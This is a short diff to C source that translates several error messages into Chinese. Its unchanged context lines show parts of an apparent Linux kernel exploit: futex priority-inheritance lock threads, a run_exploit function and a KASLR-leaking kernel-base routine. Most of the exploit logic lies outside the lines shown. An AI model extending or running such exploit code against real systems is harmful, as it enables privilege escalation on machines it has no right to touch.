@@ -25,7 +25,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   atomic_store(&waiter_tid, tid);
 
   if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("waiter lock chain errno=%d\n", errno);
+    pr_error("等待者锁链错误 错误码=%d\n", errno);
   }
 
   atomic_store(&waiter_ready, 1);
@@ -55,7 +55,7 @@ void *owner_thread(void *arg __attribute__((unused))) {
 
   long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   if (lock_target != 0) {
-    pr_error("owner lock target errno=%d\n", errno);
+    pr_error("持有者锁目标错误 错误码=%d\n", errno);
   }
 
   while (!atomic_load(&waiter_ready)) {
@@ -181,7 +181,7 @@ int run_exploit(int argc, char **argv) {
 
   pin_to_core(CORE);
   if (!slide_leak_kernel_base()) {
-    pr_error("slide kaslr leak failed\n");
+    pr_error("slide kaslr泄露失败\n");
     return 1;
   }
 
